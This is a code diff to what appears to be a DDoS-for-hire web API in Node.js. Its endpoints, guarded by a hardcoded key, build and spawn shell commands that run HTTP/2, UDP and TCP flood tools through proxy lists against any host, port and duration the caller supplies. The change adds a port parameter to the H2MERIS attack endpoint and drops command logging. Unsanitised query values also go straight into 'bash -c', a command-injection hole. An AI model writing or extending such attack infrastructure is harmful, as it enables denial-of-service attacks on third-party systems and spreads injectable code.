@@ -36,7 +36,7 @@ const generateCommand = (method, host, port, time) => {
         case 'H2BYPASS':
             return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 8 8 proxy.txt`;
         case 'H2MERIS':
-            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
+            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 ${port} proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'UDP':
             return `cd /root/.trash && gcc udp.c -o udp && ./udp ${host} ${port} ${time}`;
         case 'TCP':
@@ -87,28 +87,29 @@ app.get('/api', (req, res) => {
     activeProcesses.set(process.pid, process);
 });
 
-// Endpoint tambahan khusus untuk menjalankan H2MERIS
+// Endpoint khusus untuk H2MERIS dengan host, port, dan time
 app.get('/api/h2meris', (req, res) => {
     const key = req.query.key;
     const host = req.query.host;
+    const port = req.query.port;
     const time = req.query.time;
 
     if (key !== 'leance') {
         return res.status(401).json({ error: 'Invalid key' });
     }
 
-    if (!host || !time) {
-        return res.status(400).json({ error: 'Missing host or time parameter' });
+    if (!host || !port || !time) {
+        return res.status(400).json({ error: 'Missing host, port, or time parameter' });
     }
 
     res.json({
         status: 'H2MERIS attack initiated',
         host: host,
+        port: port,
         time: time
     });
 
-    const command = generateCommand('H2MERIS', host, undefined, time);
-    console.log(`Executing command: ${command}`);
+    const command = generateCommand('H2MERIS', host, port, time);
     const process = spawn('bash', ['-c', command], { detached: true });
 
     process.stdout.on('data', (data) => {
